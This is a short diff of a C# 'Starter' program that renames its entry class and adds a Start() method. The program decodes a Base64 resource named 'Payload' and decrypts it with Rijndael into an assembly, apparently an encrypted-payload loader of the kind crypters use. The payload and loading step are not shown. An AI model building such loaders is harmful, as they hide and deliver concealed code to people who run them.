@@ -8,8 +8,12 @@ using System.Security.Cryptography;
 
 namespace Starter
 {
-    internal class Program
+    internal class Entry
     {
+
+
+
+
         private static RijndaelManaged encoder;
         private static void InitDecoder()
         {
@@ -37,9 +41,17 @@ namespace Starter
 
         static void Main(string[] args)
         {
+            Start();
+        }
+
+        public static void Start()
+        {
 #if DEBUG
             Console.WriteLine("Running Decoder.");
-#endif 
+#endif
+
+
+
             InitDecoder();
             var b64 = Encoding.UTF8.GetString(Properties.Resources.Payload);
             var asm = Decrypt(Convert.FromBase64String(b64));
